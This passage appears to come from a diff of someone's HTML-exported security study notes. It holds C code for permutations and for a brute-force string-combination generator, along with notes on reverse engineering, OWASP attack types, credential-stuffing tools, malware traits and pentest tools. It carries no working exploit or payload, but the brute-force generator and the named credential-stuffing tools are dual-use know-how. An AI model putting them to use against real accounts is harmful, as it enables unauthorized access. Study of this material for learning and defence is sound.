+   <span style="color: #8ac6f2; font-weight: bold;">for</span>(<span style="color: #92a65e; font-weight: bold;">unsigned</span> <span style="color: #92a65e; font-weight: bold;">int</span> <span style="color: #cae682;">x</span> = 0; x &lt; N; x++)
+      printf(<span style="color: #95e454;">"%d "</span>,a[x]);
+   printf(<span style="color: #95e454;">"   swapped(%d, %d)\n"</span>, j, i);
+   <span style="color: #fa8072;">//</span><span style="color: #99968b; font-style: italic;">getch();  // Remove comment for "Press any key to continue" prompt.</span>
+} <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">display()</span>
+
+
+<span style="color: #92a65e; font-weight: bold;">void</span> <span style="color: #cae682; font-size: 110%; font-weight: bold;">QuickPerm</span>(<span style="color: #92a65e; font-weight: bold;">void</span>) {
+   <span style="color: #92a65e; font-weight: bold;">unsigned</span> <span style="color: #92a65e; font-weight: bold;">int</span> <span style="color: #cae682;">a</span>[N], <span style="color: #cae682;">p</span>[N];
+   <span style="color: #8ac6f2; font-weight: bold;">register</span> <span style="color: #92a65e; font-weight: bold;">unsigned</span> <span style="color: #92a65e; font-weight: bold;">int</span> <span style="color: #cae682;">i</span>, <span style="color: #cae682;">j</span>, <span style="color: #cae682;">tmp</span>; <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">Upper Index i; Lower Index j</span>
+
+   <span style="color: #8ac6f2; font-weight: bold;">for</span>(i = 0; i &lt; N; i++) {  <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">initialize arrays; a[N] can be any type</span>
+      a[i] = i + 1;   <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">a[i] value is not revealed and can be arbitrary</span>
+      p[i] = 0;       <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">p[i] == i controls iteration and index boundaries for i</span>
+   }
+   <span style="color: #fa8072;">//</span><span style="color: #99968b; font-style: italic;">display(a, 0, 0);   // remove comment to display array a[]</span>
+   i = 1;   <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">setup first swap points to be 1 and 0 respectively (i &amp; j)</span>
+   <span style="color: #8ac6f2; font-weight: bold;">while</span>(i &lt; N) {
+      <span style="color: #8ac6f2; font-weight: bold;">if</span> (p[i] &lt; i) {
+         j = i % 2 * p[i];   <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">IF i is odd then j = p[i] otherwise j = 0</span>
+         tmp = a[j];         <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">swap(a[j], a[i])</span>
+         a[j] = a[i];
+         a[i] = tmp;
+         display(a, j, i); <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">remove comment to display target array a[]</span>
+         p[i]++;             <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">increase index "weight" for i by one</span>
+         i = 1;              <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">reset index i to 1 (assumed)</span>
+      } <span style="color: #8ac6f2; font-weight: bold;">else</span> {               <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">otherwise p[i] == i</span>
+         p[i] = 0;           <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">reset p[i] to zero</span>
+         i++;                <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">set new index value for i (increase by one)</span>
+      } <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">if (p[i] &lt; i)</span>
+   } <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">while(i &lt; N)</span>
+} <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">QuickPerm()</span>
+
+
+
+
+<span style="color: #92a65e; font-weight: bold;">int</span> <span style="color: #cae682; font-size: 110%; font-weight: bold;">main</span>(){
+  QuickPerm()
+}
+
+</pre>
+</div>
+</div>
+</div>
+<div id="outline-container-org7caefc7" class="outline-3">
+<h3 id="org7caefc7"><span class="section-number-3">8.17</span> brutefoce in c</h3>
+<div class="outline-text-3" id="text-8-17">
+<ul class="org-ul">
+<li><a href="https://github.com/Jsdemonsim/Stackoverflow/tree/master/alphabet">https://github.com/Jsdemonsim/Stackoverflow/tree/master/alphabet</a></li>
+</ul>
+<div class="org-src-container">
+<pre class="src src-c"><span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">Print all combinations of the given alphabet up to length n.</span>
+<span style="color: #fa8072;">//</span>
+<span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">Example: length 3 combinations are:</span>
+<span style="color: #fa8072;">//</span>
+<span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">aaa</span>
+<span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">aab</span>
+<span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">aac</span>
+<span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">...</span>
+<span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">aa9</span>
+<span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">aba</span>
+<span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">abb</span>
+<span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">abc</span>
+<span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">...</span>
+<span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">a99</span>
+<span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">baa</span>
+<span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">bab</span>
+<span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">...</span>
+<span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">998</span>
+<span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">999</span>
+<span style="color: #fa8072;">//</span>
+<span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">The best way to test this program is to output to /dev/null, otherwise</span>
+<span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">the file I/O will dominate the test time.</span>
+<span style="color: #fa8072;">//</span>
+<span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">This is the same as alphabet.c except this version uses 3 hardcoded</span>
+<span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">letters instead of 2.</span>
+<span style="color: #6495ed; font-style: italic;">#include</span> <span style="color: #95e454;">&lt;stdio.h&gt;</span>
+<span style="color: #6495ed; font-style: italic;">#include</span> <span style="color: #95e454;">&lt;stdlib.h&gt;</span>
+<span style="color: #6495ed; font-style: italic;">#include</span> <span style="color: #95e454;">&lt;string.h&gt;</span>
+<span style="color: #6495ed; font-style: italic;">#include</span> <span style="color: #95e454;">&lt;unistd.h&gt;</span>
+
+<span style="color: #8ac6f2; font-weight: bold;">const</span> <span style="color: #92a65e; font-weight: bold;">char</span> *<span style="color: #cae682;">alphabet</span> = <span style="color: #95e454;">"abcdefghijklmnopqrstuvwxyz"</span>
+                       <span style="color: #95e454;">"ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>
+                       <span style="color: #95e454;">"0123456789"</span>;
+
+<span style="color: #8ac6f2; font-weight: bold;">static</span> <span style="color: #92a65e; font-weight: bold;">void</span> <span style="color: #cae682; font-size: 110%; font-weight: bold;">generate</span>(<span style="color: #92a65e; font-weight: bold;">int</span> <span style="color: #cae682;">maxlen</span>);
+
+<span style="color: #92a65e; font-weight: bold;">int</span> <span style="color: #cae682; font-size: 110%; font-weight: bold;">main</span>(<span style="color: #92a65e; font-weight: bold;">int</span> <span style="color: #cae682;">argc</span>, <span style="color: #92a65e; font-weight: bold;">char</span> *<span style="color: #cae682;">argv</span>[])
+{
+    <span style="color: #8ac6f2; font-weight: bold;">if</span> (argc &lt; 2) {
+        fprintf(stderr, <span style="color: #95e454;">"Usage: %s Length\n"</span>, argv[0]);
+        exit(1);
+    }
+
+    generate(atoi(argv[1]));
+    <span style="color: #8ac6f2; font-weight: bold;">return</span> 0;
+}
+
+<span style="color: #f08080; font-style: italic;">/**</span>
+<span style="color: #f08080; font-style: italic;"> * Generates all patterns of the alphabet up to maxlen in length.  This</span>
+<span style="color: #f08080; font-style: italic;"> * function uses a buffer that holds alphaLen^3 patterns at a time.</span>
+<span style="color: #f08080; font-style: italic;"> * One pattern of length 5 would be "aaaaa\n".  The reason that alphaLen^3</span>
+<span style="color: #f08080; font-style: italic;"> * patterns are used is because we prepopulate the buffer with the last 3</span>
+<span style="color: #f08080; font-style: italic;"> * letters already set to all possible combinations.  So for example,</span>
+<span style="color: #f08080; font-style: italic;"> * the buffer initially looks like "aaaaa\naaaab\naaaac\n ... aa999\n".  Then</span>
+<span style="color: #f08080; font-style: italic;"> * on every iteration, we </span><span style="color: #e5786d; font-weight: bold; font-style: italic;">write()</span><span style="color: #f08080; font-style: italic;"> the buffer out, and then increment the</span>
+<span style="color: #f08080; font-style: italic;"> * fourth to last letter.  So on the first iteration, the buffer is modified</span>
+<span style="color: #f08080; font-style: italic;"> * to look like "abaaa\nabaab\nabaac\n ... ab999\n".  This continues until</span>
+<span style="color: #f08080; font-style: italic;"> * all combinations of letters are exhausted.</span>
+<span style="color: #f08080; font-style: italic;"> */</span>
+<span style="color: #8ac6f2; font-weight: bold;">static</span> <span style="color: #92a65e; font-weight: bold;">void</span> <span style="color: #cae682; font-size: 110%; font-weight: bold;">generate</span>(<span style="color: #92a65e; font-weight: bold;">int</span> <span style="color: #cae682;">maxlen</span>)
+{
+    <span style="color: #92a65e; font-weight: bold;">int</span>   <span style="color: #cae682;">alphaLen</span> = strlen(alphabet);
+    <span style="color: #92a65e; font-weight: bold;">int</span>   <span style="color: #cae682;">len</span>      = 0;
+    <span style="color: #92a65e; font-weight: bold;">char</span> *<span style="color: #cae682;">buffer</span>   = malloc((maxlen + 1) * alphaLen * alphaLen * alphaLen);
+    <span style="color: #92a65e; font-weight: bold;">int</span>  *<span style="color: #cae682;">letters</span>  = malloc(<span style="color: #92a65e; font-weight: bold;">maxlen</span> * <span style="color: #8ac6f2; font-weight: bold;">sizeof</span>(<span style="color: #92a65e; font-weight: bold;">int</span>));
+
+    <span style="color: #8ac6f2; font-weight: bold;">if</span> (buffer == <span style="color: #e5786d; font-weight: bold;">NULL</span> || letters == <span style="color: #e5786d; font-weight: bold;">NULL</span>) {
+        fprintf(stderr, <span style="color: #95e454;">"Not enough memory.\n"</span>);
+        exit(1);
+    }
+
+    <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">This for loop generates all 1 letter patterns, then 2 letters, etc,</span>
+    <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">up to the given maxlen.</span>
+    <span style="color: #8ac6f2; font-weight: bold;">for</span> (len=1;len&lt;=maxlen;len++) {
+        <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">The stride is one larger than len because each line has a '\n'.</span>
+        <span style="color: #92a65e; font-weight: bold;">int</span> <span style="color: #cae682;">i</span>;
+        <span style="color: #92a65e; font-weight: bold;">int</span> <span style="color: #cae682;">stride</span> = len+1;
+        <span style="color: #92a65e; font-weight: bold;">int</span> <span style="color: #cae682;">bufLen</span> = stride * alphaLen * alphaLen * alphaLen;
+
+        <span style="color: #8ac6f2; font-weight: bold;">if</span> (len == 1) {
+            <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">Special case.  The main algorithm hardcodes the last two</span>
+            <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">letters, so this case needs to be handled separately.</span>
+            <span style="color: #92a65e; font-weight: bold;">int</span> <span style="color: #cae682;">j</span> = 0;
+            bufLen = (len + 1) * alphaLen;
+            <span style="color: #8ac6f2; font-weight: bold;">for</span> (i=0;i&lt;alphaLen;i++) {
+                buffer[j++] = alphabet[i];
+                buffer[j++] = <span style="color: #95e454;">'\n'</span>;
+            }
+            write(STDOUT_FILENO, buffer, bufLen);
+            <span style="color: #8ac6f2; font-weight: bold;">continue</span>;
+        } <span style="color: #8ac6f2; font-weight: bold;">else</span> <span style="color: #8ac6f2; font-weight: bold;">if</span> (len == 2) {
+            <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">Also a special case.</span>
+            <span style="color: #92a65e; font-weight: bold;">int</span> <span style="color: #cae682;">let0</span> = 0;
+            <span style="color: #92a65e; font-weight: bold;">int</span> <span style="color: #cae682;">let1</span> = 0;
+            bufLen = (len + 1) * alphaLen * alphaLen;
+            <span style="color: #8ac6f2; font-weight: bold;">for</span> (i=0;i&lt;bufLen;i+=stride) {
+                buffer[i]   = alphabet[let0];
+                buffer[i+1] = alphabet[let1++];
+                buffer[i+2] = <span style="color: #95e454;">'\n'</span>;
+                <span style="color: #8ac6f2; font-weight: bold;">if</span> (let1 == alphaLen) {
+                    let1 = 0;
+                    let0++;
+                    <span style="color: #8ac6f2; font-weight: bold;">if</span> (let0 == alphaLen)
+                        let0 = 0;
+                }
+            }
+            write(STDOUT_FILENO, buffer, bufLen);
+            <span style="color: #8ac6f2; font-weight: bold;">continue</span>;
+        }
+
+        <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">Initialize buffer to contain all first letters.</span>
+        memset(buffer, alphabet[0], bufLen);
+
+        <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">Now write all the last 3 letters and newlines, which</span>
+        <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">will after this not change during the main algorithm.</span>
+        {
+            <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">Let0 is the 3rd to last letter.  Let1 is the 2nd to last letter.</span>
+            <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">Let2 is the last letter.</span>
+            <span style="color: #92a65e; font-weight: bold;">int</span> <span style="color: #cae682;">let0</span> = 0;
+            <span style="color: #92a65e; font-weight: bold;">int</span> <span style="color: #cae682;">let1</span> = 0;
+            <span style="color: #92a65e; font-weight: bold;">int</span> <span style="color: #cae682;">let2</span> = 0;
+            <span style="color: #8ac6f2; font-weight: bold;">for</span> (i=len-3;i&lt;bufLen;i+=stride) {
+                buffer[i]   = alphabet[let0];
+                buffer[i+1] = alphabet[let1];
+                buffer[i+2] = alphabet[let2++];
+                buffer[i+3] = <span style="color: #95e454;">'\n'</span>;
+                <span style="color: #8ac6f2; font-weight: bold;">if</span> (let2 == alphaLen) {
+                    let2 = 0;
+                    let1++;
+                    <span style="color: #8ac6f2; font-weight: bold;">if</span> (let1 == alphaLen) {
+                        let1 = 0;
+                        let0++;
+                        <span style="color: #8ac6f2; font-weight: bold;">if</span> (let0 == alphaLen)
+                            let0 = 0;
+                    }
+                }
+            }
+        }
+
+        <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">Write the first sequence out.</span>
+        write(STDOUT_FILENO, buffer, bufLen);
+
+        <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">Special case for length 3, we're already done.</span>
+        <span style="color: #8ac6f2; font-weight: bold;">if</span> (len == 3)
+            <span style="color: #8ac6f2; font-weight: bold;">continue</span>;
+
+        <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">Set all the letters to 0.</span>
+        <span style="color: #8ac6f2; font-weight: bold;">for</span> (i=0;i&lt;len;i++)
+            letters[i] = 0;
+
+        <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">Now on each iteration, increment the the fourth to last letter.</span>
+        i = len-4;
+        <span style="color: #8ac6f2; font-weight: bold;">do</span> {
+            <span style="color: #92a65e; font-weight: bold;">char</span> <span style="color: #cae682;">c</span>;
+            <span style="color: #92a65e; font-weight: bold;">int</span>  <span style="color: #cae682;">j</span>;
+
+            <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">Increment this letter.</span>
+            letters[i]++;
+
+            <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">Handle wraparound.</span>
+            <span style="color: #8ac6f2; font-weight: bold;">if</span> (letters[i] &gt;= alphaLen)
+                letters[i] = 0;
+
+            <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">Set this letter in the proper places in the buffer.</span>
+            c = alphabet[letters[i]];
+            <span style="color: #8ac6f2; font-weight: bold;">for</span> (j=i;j&lt;bufLen;j+=stride)
+                buffer[j] = c;
+
+            <span style="color: #8ac6f2; font-weight: bold;">if</span> (letters[i] != 0) {
+                <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">No wraparound, so we finally finished incrementing.</span>
+                <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">Write out this set.  Reset i back to second to last letter.</span>
+                write(STDOUT_FILENO, buffer, bufLen);
+                i = len - 4;
+                <span style="color: #8ac6f2; font-weight: bold;">continue</span>;
+            }
+
+            <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">The letter wrapped around ("carried").  Set up to increment</span>
+            <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">the next letter on the left.</span>
+            i--;
+            <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">If we carried past last letter, we're done with this</span>
+            <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">whole length.</span>
+            <span style="color: #8ac6f2; font-weight: bold;">if</span> (i &lt; 0)
+                <span style="color: #8ac6f2; font-weight: bold;">break</span>;
+        } <span style="color: #8ac6f2; font-weight: bold;">while</span>(1);
+    }
+
+    <span style="color: #fa8072;">// </span><span style="color: #99968b; font-style: italic;">Clean up.</span>
+    free(letters);
+    free(buffer);
+}
+
+
+</pre>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-org24873f9" class="outline-2">
+<h2 id="org24873f9"><span class="section-number-2">9</span> reverse engeering</h2>
+<div class="outline-text-2" id="text-9">
+<ul class="org-ul">
+<li>$strings file</li>
+<li>first libraries</li>
+<li>last portion of the list contains names of sections of the file</li>
+</ul>
+</div>
+
+
+
+<div id="outline-container-orgff96dc2" class="outline-3">
+<h3 id="orgff96dc2"><span class="section-number-3">9.1</span> links</h3>
+<div class="outline-text-3" id="text-9-1">
+<p>
+<a href="https://www.codementor.io/@packt/reverse-engineering-a-linux-executable-hello-world-rjceryk5d">https://www.codementor.io/@packt/reverse-engineering-a-linux-executable-hello-world-rjceryk5d</a>
+</p>
+</div>
+</div>
+
+<div id="outline-container-orgd05e67c" class="outline-3">
+<h3 id="orgd05e67c"><span class="section-number-3">9.2</span> objdump</h3>
+<div class="outline-text-3" id="text-9-2">
+<p>
+objdump -d hello &gt; disassembly.asm
+</p>
+<ul class="org-ul">
+<li>AT&amp;T disassembly syntax</li>
+</ul>
+
+
+<p>
+objdump -M intel -d hello &gt; disassembly.asm
+</p>
+</div>
+</div>
+<div id="outline-container-orgee67737" class="outline-3">
+<h3 id="orgee67737"><span class="section-number-3">9.3</span> <span class="todo TODO">TODO</span> file</h3>
+</div>
+<div id="outline-container-org60d399b" class="outline-3">
+<h3 id="org60d399b"><span class="section-number-3">9.4</span> Dynamic analysis</h3>
+<div class="outline-text-3" id="text-9-4">
+<p>
+should be done in a sandbox environment
+</p>
+<ul class="org-ul">
+<li>trace
+<ul class="org-ul">
+<li>hows a readable code of what the program did</li>
+<li>logged library functions that the program called and received</li>
+</ul></li>
+<li>strace
+<ul class="org-ul">
+<li>logs system calls
+<ul class="org-ul">
+<li>execve runs a program pointed to by the filename</li>
+<li>open and read are system calls that are used here to read files</li>
+<li>mmap2, mprotect, and brk are responsible for memory activities such as allocation,
+permissions, and segment boundary setting</li>
+</ul></li>
+</ul></li>
+</ul>
+</div>
+<div id="outline-container-org792287a" class="outline-4">
+<h4 id="org792287a"><span class="section-number-4">9.4.1</span> gdb</h4>
+<div class="outline-text-4" id="text-9-4-1">
+<p>
+<a href="https://www.youtube.com/watch?v=PorfLSr3DDI">https://www.youtube.com/watch?v=PorfLSr3DDI</a>
+default AT&amp;T sytnax
+</p>
+
+<p>
+commands:
+</p>
+<ul class="org-ul">
+<li>disass command - disassembly of specified functions</li>
+<li>set disassembly-flavor intel - Intel syntax</li>
+</ul>
+</div>
+</div>
+</div>
+<div id="outline-container-org68aa8ae" class="outline-3">
+<h3 id="org68aa8ae"><span class="section-number-3">9.5</span> Assembler</h3>
+<div class="outline-text-3" id="text-9-5">
+<p>
+<a href="https://en.wikipedia.org/wiki/X86_assembly_language">https://en.wikipedia.org/wiki/X86_assembly_language</a>
+</p>
+
+
+<p>
+consists of a series of
+</p>
+<ul class="org-ul">
+<li>mnemonic processor instructions - consist of an <b>opcode mnemonic</b> followed by an <b>operand</b>, which
+might be a list of data, arguments or parameters</li>
+<li>meta-statements (known variously as
+<ul class="org-ul">
+<li>declarative operations</li>
+<li>directives</li>
+<li>pseudo-instructions</li>
+<li>pseudo-operations</li>
+<li>pseudo-ops</li>
+</ul></li>
+<li>comments</li>
+<li>data</li>
+</ul>
+
+<p>
+Parity bit - error detecting code
+</p>
+
+<p>
+data sizes −
+</p>
+
+<ul class="org-ul">
+<li>Word: a 2-byte data item</li>
+<li>Doubleword: a 4-byte (32 bit) data item</li>
+<li>Quadword: an 8-byte (64 bit) data item</li>
+<li>Paragraph: a 16-byte (128 bit) area</li>
+<li>Kilobyte: 1024 bytes</li>
+<li>Megabyte: 1,048,576 bytes</li>
+</ul>
+
+<p>
+fetch-decode-execute cycle or the execution cycle:
+</p>
+<ul class="org-ul">
+<li>The processor may access one or more bytes of memory at a time</li>
+<li>The processor stores data in reverse-byte sequence</li>
+<li>steps:
+<ul class="org-ul">
+<li>Fetching the instruction from memory</li>
+<li>Decoding or identifying the instruction</li>
+<li>Executing the instruction</li>
+</ul></li>
+</ul>
+
+<p>
+two kinds of memory addresses
+</p>
+<ul class="org-ul">
+<li>Absolute address - a direct reference of specific location.</li>
+<li>Segment address (or offset) - starting address of a memory segment with the offset value.</li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-orge41945a" class="outline-3">
+<h3 id="orge41945a"><span class="section-number-3">9.6</span> syntaxes</h3>
+<div class="outline-text-3" id="text-9-6">
+<ul class="org-ul">
+<li>Intel syntax - x86 assembly language - dominant in the DOS and Windows world</li>
+<li>AT&amp;T syntax is dominant in the Unix world</li>
+</ul>
+</div>
+</div>
+</div>
+<div id="outline-container-orgba9b689" class="outline-2">
+<h2 id="orgba9b689"><span class="section-number-2">10</span> attacks theory</h2>
+<div class="outline-text-2" id="text-10">
+<ul class="org-ul">
+<li>Credential stuffing - collects stolen account credentials, email addresses and the corresponding passwords (often from
+a data breach), and then uses the credentials to gain unauthorized access to user accounts on other systems through
+large-scale automated login
+<ul class="org-ul">
+<li>Selenium, cURL, PhantomJS or tools designed specifically for these types of attacks, such as Sentry MBA, SNIPR,
+STORM, Blackbullet and Openbullet</li>
+</ul></li>
+<li>web cache poisoning <a href="https://portswigger.net/research/practical-web-cache-poisoning">https://portswigger.net/research/practical-web-cache-poisoning</a></li>
+</ul>
+</div>
+<div id="outline-container-org55475d9" class="outline-3">
+<h3 id="org55475d9"><span class="section-number-3">10.1</span> base attacks</h3>
+<div class="outline-text-3" id="text-10-1">
+<ul class="org-ul">
+<li><b>Replay attack</b> network attack in which a valid data transmission is repeated or delayed
+<ul class="org-ul">
+<li>possibly as part of a spoofing attack by IP packet substitution</li>
+<li>prevented with session id/token</li>
+</ul></li>
+<li><b>spoofing</b> attack</li>
+<li><b>Denial-of-service</b> attack (DoS)</li>
+<li><b>Man-in-the-middle</b> attack - alters the communications</li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-org25c168f" class="outline-3">
+<h3 id="org25c168f"><span class="section-number-3">10.2</span> server-side attacks</h3>
+<div class="outline-text-3" id="text-10-2">
+<p>
+TODO expliot
+</p>
+</div>
+</div>
+<div id="outline-container-orgf316b2b" class="outline-3">
+<h3 id="orgf316b2b"><span class="section-number-3">10.3</span> client-side attacks</h3>
+<div class="outline-text-3" id="text-10-3">
+</div>
+<div id="outline-container-org8345d59" class="outline-4">
+<h4 id="org8345d59"><span class="section-number-4">10.3.1</span> injection attack</h4>
+<div class="outline-text-4" id="text-10-3-1">
+<p>
+supplies untrusted input to a program
+</p>
+</div>
+<ol class="org-ol">
+<li><a id="org911e263"></a><span class="todo TODO">TODO</span> SQLi<br /></li>
+<li><a id="org8897de7"></a>Cross Site Scripting (XSS)<br />
+<div class="outline-text-5" id="text-10-3-1-2">
+<ul class="org-ul">
+<li>inject code on page
+<ul class="org-ul">
+<li>without proper validation or escaping</li>
+<li>updates an existing web page with user-supplied data using a browser API that can create HTML or
+JavaScript.</li>
+</ul></li>
+<li>call by user</li>
+</ul>
+</div>
+</li>
+<li><a id="org0cdce7d"></a><span class="todo TODO">TODO</span> OSCI<br /></li>
+</ol>
+</div>
+</div>
+
+<div id="outline-container-orgf2e7818" class="outline-3">
+<h3 id="orgf2e7818"><span class="section-number-3">10.4</span> OWASP top 10</h3>
+<div class="outline-text-3" id="text-10-4">
+<ul class="org-ul">
+<li>injection</li>
+</ul>
+</div>
+<div id="outline-container-org28d628c" class="outline-4">
+<h4 id="org28d628c"><span class="section-number-4">10.4.1</span> <span class="todo TODO">TODO</span> Broken Authentication and Session Management</h4>
+</div>
+<div id="outline-container-org845dd21" class="outline-4">
+<h4 id="org845dd21"><span class="section-number-4">10.4.2</span> Sensitive Data Exposure</h4>
+<div class="outline-text-4" id="text-10-4-2">
+<p>
+data may be compromised without extra protection, such as encryption at rest or in transit, and
+requires special precautions when exchanged with the browser.
+</p>
+</div>
+</div>
+<div id="outline-container-orgf909dc8" class="outline-4">
+<h4 id="orgf909dc8"><span class="section-number-4">10.4.3</span> XML External Entities (XXE).</h4>
+<div class="outline-text-4" id="text-10-4-3">
+<ul class="org-ul">
+<li>older or poorly configured XML processors evaluate external entity references within XML
+documents.</li>
+<li>External entities can be used to disclose internal files using the file URI handler,</li>
+</ul>
+<p>
+internal file shares, internal port scanning, remote code execution, and denial of service attacks.
+</p>
+</div>
+</div>
+<div id="outline-container-orgf5ec908" class="outline-4">
+<h4 id="orgf5ec908"><span class="section-number-4">10.4.4</span> Broken Access Control.</h4>
+<div class="outline-text-4" id="text-10-4-4">
+<ul class="org-ul">
+<li>Restrictions on what authenticated users are allowed to do are often not properly enforced.</li>
+<li>Attackers can exploit these flaws to access unauthorized functionality and/or data, such as access</li>
+</ul>
+<p>
+other users’ accounts, view sensitive files, modify other users’ data, change access rights, etc.
+</p>
+</div>
+</div>
+<div id="outline-container-org53c57d5" class="outline-4">
+<h4 id="org53c57d5"><span class="section-number-4">10.4.5</span> Security Misconfiguration</h4>
+<div class="outline-text-4" id="text-10-4-5">
+<ul class="org-ul">
+<li>default configurations</li>
+<li>incomplete or ad hoc configurations</li>
+<li>open cloud storage</li>
+<li>misconfigured HTTP headers</li>
+<li>verbose error messages containing sensitive information</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-org18cb345" class="outline-4">
+<h4 id="org18cb345"><span class="section-number-4">10.4.6</span> Insecure Deserialization</h4>
+<div class="outline-text-4" id="text-10-4-6">
+<p>
+allow replay attacks, injection attacks, and privilege escalation attacks.
+</p>
+</div>
+</div>
+<div id="outline-container-org4321a91" class="outline-4">
+<h4 id="org4321a91"><span class="section-number-4">10.4.7</span> Using Components with Known Vulnerabilities</h4>
+<div class="outline-text-4" id="text-10-4-7">
+<p>
+libraries, frameworks, and other software modules, run with the same privileges as the application
+</p>
+</div>
+</div>
+<div id="outline-container-org3a49d90" class="outline-4">
+<h4 id="org3a49d90"><span class="section-number-4">10.4.8</span> Insufficient Logging &amp; Monitoring</h4>
+</div>
+</div>
+<div id="outline-container-org82f2f6c" class="outline-3">
+<h3 id="org82f2f6c"><span class="section-number-3">10.5</span> links</h3>
+<div class="outline-text-3" id="text-10-5">
+<ul class="org-ul">
+<li>all attacks <a href="https://portswigger.net/kb/issues">https://portswigger.net/kb/issues</a></li>
+</ul>
+</div>
+</div>
+</div>
+<div id="outline-container-orgc94306d" class="outline-2">
+<h2 id="orgc94306d"><span class="section-number-2">11</span> virus</h2>
+<div class="outline-text-2" id="text-11">
+<p>
+32- and 64-bit versions
+</p>
+<ul class="org-ul">
+<li>run a few tests and see what kind of capabilities its current user has</li>
+<li>reporting the results to a C&amp;C server.</li>
+<li>can receive new modules</li>
+<li>has a small size</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-org8e56c79" class="outline-2">
+<h2 id="org8e56c79"><span class="section-number-2">12</span> virus spreading</h2>
+<div class="outline-text-2" id="text-12">
+<ul class="org-ul">
+<li>Spear phishing</li>
+<li>attacker brute-forcing services with exposed ports</li>
+</ul>
+</div>
+</div>
+<div id="outline-container-org200db34" class="outline-2">
+<h2 id="org200db34"><span class="section-number-2">13</span> NN code scaner</h2>
+<div class="outline-text-2" id="text-13">
+<ul class="org-ul">
+<li>2018 <a href="https://arxiv.org/pdf/1807.04320.pdf">https://arxiv.org/pdf/1807.04320.pdf</a></li>
+<li>PHP NN scan 2020 <a href="https://arxiv.org/pdf/2012.08835.pdf">https://arxiv.org/pdf/2012.08835.pdf</a></li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-org2c66691" class="outline-2">
+<h2 id="org2c66691"><span class="section-number-2">14</span> penetration / infiltrate system</h2>
+<div class="outline-text-2" id="text-14">
+<p>
+penetration tests focus on unpatched vulnerabilities and misconfigurations
+</p>
+</div>
+<div id="outline-container-org3c64227" class="outline-3">
+<h3 id="org3c64227"><span class="section-number-3">14.1</span> penetration testing tool</h3>
+<div class="outline-text-3" id="text-14-1">
+<p>
+TOTDO:
+</p>
+<ul class="org-ul">
+<li>BackBox</li>
+<li>Hping</li>
+<li>Metasploit Project - payloads</li>
+<li>Nessus - payloads</li>
+<li>Nmap</li>
+<li>SAINT</li>
+<li>w3af - payloads</li>
